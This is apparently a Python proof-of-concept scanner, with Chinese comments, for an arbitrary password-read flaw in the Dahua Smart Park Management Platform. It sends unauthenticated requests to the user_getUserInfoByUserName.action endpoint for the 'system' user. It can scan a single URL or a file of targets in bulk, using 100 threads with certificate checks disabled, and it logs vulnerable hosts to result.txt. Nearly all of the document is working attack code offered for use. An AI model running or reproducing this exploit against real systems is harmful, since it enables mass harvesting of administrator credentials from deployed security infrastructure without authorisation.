# 导包
import re,parser,requests,sys,os,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止他报错

# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                            author:pray
                                            version:1.0.0
                                            BY:大华智慧园区管理平台任意密码读取
"""
    print(banner)

# poc模块
def poc(target):
    url = target+"/admin/user_getUserInfoByUserName.action?userName=system"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
    }
    res = requests.get(url=url,headers=headers,verify=False,timeout=5)
    try:
        if "loginName" in res.text:
            print("[+]该站点存在漏洞,url:"+target)
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
        else :
            print("[-]该站点不存在漏洞,url:"+target)
    except Exception as e:
        print(e)

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a testing tool")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()